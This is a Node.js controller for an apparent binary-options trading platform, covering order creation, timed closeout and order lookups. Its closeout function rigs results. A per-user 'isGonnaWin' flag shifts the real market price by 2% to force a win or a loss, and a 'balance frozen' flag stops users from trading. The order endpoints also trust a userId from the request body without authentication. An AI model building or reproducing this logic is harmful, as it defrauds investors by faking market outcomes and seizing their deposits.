const Order = require("../models/orderSchema");
const axios = require("axios");
const User = require("../models/UserSchema");

// Constants
const API_URL = "http://localhost:5000/api/currencies";

// Function to fetch the price of a symbol
const fetchPrice = async (symbol) => {
  try {
    const response = await axios.get(`${API_URL}/${symbol}`);
    return response.data.price; // Assuming the price is in the response data
  } catch (error) {
    console.error("Error fetching price:", error);
    throw new Error("Failed to fetch price");
  }
};

const transitionOrderToCloseout = async (orderId) => {
  try {
    console.log(`Transitioning order ${orderId} to closeout...`);

    // Fetch the order
    const order = await Order.findById(orderId);
    if (!order) {
      console.error(`Order not found for transition: ${orderId}`);
      return;
    }

    // Fetch the user
    const user = await User.findById(order.userId);
    if (!user) {
      console.error(`User not found for order: ${orderId}`);
      return;
    }

    // Fetch the closeout price
    let closeOutPrice = await fetchPrice(order.symbol); // Change const to let
    if (!closeOutPrice) {
      console.error(
        `Failed to fetch closeout price for symbol: ${order.symbol}`
      );
      return;
    }

    // If isGonnaWin is true, adjust the closeout price to simulate a favorable move
    if (user.isGonnaWin) {
      // If it's a "Buy Up" order, simulate the price going up
      if (order.direction === "Buy Up") {
        closeOutPrice = closeOutPrice * 1.02; // Simulate a 2% increase
      }
      // If it's a "Buy Down" order, simulate the price going down
      else if (order.direction === "Buy Down") {
        closeOutPrice = closeOutPrice * 0.98; // Simulate a 2% decrease
      }
    } else {
      // If isGonnaWin is false, adjust the closeout price to simulate an unfavorable move
      // If it's a "Buy Up" order, simulate the price going down (user loses)
      if (order.direction === "Buy Up") {
        closeOutPrice = closeOutPrice * 0.98; // Simulate a 2% decrease
      }
      // If it's a "Buy Down" order, simulate the price going up (user loses)
      else if (order.direction === "Buy Down") {
        closeOutPrice = closeOutPrice * 1.02; // Simulate a 2% increase
      }
    }

    // Determine if it's a win or loss
    const isWin =
      (order.direction === "Buy Up" && closeOutPrice > order.orderPrice) ||
      (order.direction === "Buy Down" && closeOutPrice < order.orderPrice);

    // Update the order with isWin or isLoss
    order.isWin = isWin;
    order.isLoss = !isWin;

    const profit = isWin
      ? (order.profitPercentage / 100) * order.investment
      : 0;

    console.log(`User balance before transition: ${user.balance}`);

    // Update the user balance
    if (isWin) {
      user.balance += order.investment + profit; // Refund investment + profit on win
    } else {
      console.log(
        `Order ${orderId}: User ${user._id} lost. Balance remains: ${user.balance}`
      );
    }

    console.log(`User balance after transition: ${user.balance}`);

    // Save updated user balance to the database
    await user.save();

    // Update order details
    order.status = "closeout";
    order.closeOutPrice = closeOutPrice;
    order.profit = profit; // Record profit for reporting
    await order.save();

    console.log(`Order ${orderId} successfully transitioned to closeout.`);
  } catch (error) {
    console.error(`Error transitioning order ${orderId} to closeout:`, error);
  }
};

// Helper function to parse duration
const parseDuration = (duration) => {
  const timeUnit = duration.slice(-1); // Get the last character (s for seconds)
  const timeValue = parseInt(duration.slice(0, -1)); // Get the numeric part

  if (timeUnit === "s") {
    return timeValue * 1000; // Convert seconds to milliseconds
  }
  // Add more units if needed (e.g., 'm' for minutes)
  return timeValue; // Default to milliseconds if no unit is recognized
};

// Create a new order
exports.createOrder = async (req, res) => {
  const {
    userId,
    symbol,
    direction,
    investment,
    duration,
    profitPercentage,
    orderPrice,
  } = req.body;

  if (
    !userId ||
    !symbol ||
    !direction ||
    !investment ||
    !duration ||
    !profitPercentage ||
    !orderPrice
  ) {
    return res.status(400).json({ message: "All fields are required." });
  }

  if (investment <= 0) {
    return res
      .status(400)
      .json({ message: "Investment must be a positive number." });
  }

  try {
    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).json({ message: "User not found." });
    }

    // Check if the user's balance is frozen
    if (user.isBalanceFrozen) {
      return res.status(403).json({ message: "User's balance is frozen. Cannot place order." });
    }

    if (user.balance < investment) {
      return res
        .status(400)
        .json({ message: "Insufficient balance to place the order." });
    }

    // Deduct investment from the balance
    user.balance -= investment;
    await user.save();

    // Create and save the order
    const newOrder = new Order({
      userId,
      symbol,
      direction,
      investment,
      duration,
      profitPercentage,
      orderPrice,
    });
    await newOrder.save();

    // Schedule order transition
    const durationInMilliseconds = parseDuration(duration);
    setTimeout(() => {
      transitionOrderToCloseout(newOrder._id); // Transition order after the duration
    }, durationInMilliseconds);

    // Respond with success and updated balance
    return res.status(201).json({
      message: "Order created successfully.",
      order: newOrder,
      remainingBalance: user.balance,
    });
  } catch (error) {
    console.error("Error creating order:", error);
    return res.status(500).json({ message: "Failed to create order.", error });
  }
};

// Get all orders
exports.getAllOrders = async (req, res) => {
  try {
    const orders = await Order.find().populate("userId", "name email");

    // Format the orders to match the desired structure
    const formattedOrders = orders.map((order) => ({
      _id: order._id,
      userId: order.userId._id, // Extract userId as a string
      symbol: order.symbol,
      direction: order.direction,
      investment: order.investment,
      duration: order.duration,
      profitPercentage: order.profitPercentage,
      orderPrice: order.orderPrice,
      status: order.status,
      isWin: order.isWin,
      isLoss: order.isLoss,
      createdAt: order.createdAt,
      closeOutPrice: order.closeOutPrice,
      __v: order.__v,
    }));

    return res.status(200).json({ orders: formattedOrders });
  } catch (error) {
    console.error("Error fetching orders:", error);
    return res.status(500).json({ message: "Failed to fetch orders.", error });
  }
};

// Get a specific order by ID
exports.getOrderById = async (req, res) => {
  const { orderId } = req.params;

  try {
    const order = await Order.findById(orderId).populate("userId");
    if (!order) {
      return res.status(404).json({ message: "Order not found." });
    }
    return res.status(200).json({ order });
  } catch (error) {
    console.error("Error fetching order by ID:", error);
    return res.status(500).json({ message: "Failed to fetch order.", error });
  }
};

// Get all orders for a specific user
exports.getUserOrders = async (req, res) => {
  const { userId } = req.params;

  try {
    const orders = await Order.find({ userId }).exec();
    return res.status(200).json({ orders });
  } catch (error) {
    console.error("Error fetching orders for user:", error);
    return res.status(500).json({ message: "Failed to fetch orders.", error });
  }
};

// Get orders for a specific subadmin
exports.getOrdersBySubAdmin = async (req, res) => {
  const { userId } = req.params; // Get the subadmin's userId from the request parameters
  console.log("subAdmin userId:", userId);

  try {
    // Step 1: Fetch all users referred by the subadmin
    const referredUsers = await User.find({ referredBy: userId }); // Find users referred by this subadmin
    console.log("Referred users:", referredUsers);

    // Step 2: Fetch orders for the referred users
    const orders = await Order.find({
      userId: { $in: referredUsers.map((user) => user._id) },
    }); // Fetch orders for the referred users
    console.log("orders:", orders);

    res.status(200).json(orders);
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
};

// Get price after a specified duration
exports.getPriceAfterDuration = async (req, res) => {
  const { symbol, duration } = req.params;

  const durationInMilliseconds = parseInt(duration) * 1000;

  setTimeout(async () => {
    try {
      const response = await axios.get(`${API_URL}/${symbol}`);
      const price = response.data.price;

      return res.status(200).json({ symbol, price });
    } catch (error) {
      console.error("Error fetching price:", error);
      return res.status(500).json({ message: "Failed to fetch price.", error });
    }
  }, durationInMilliseconds);
};
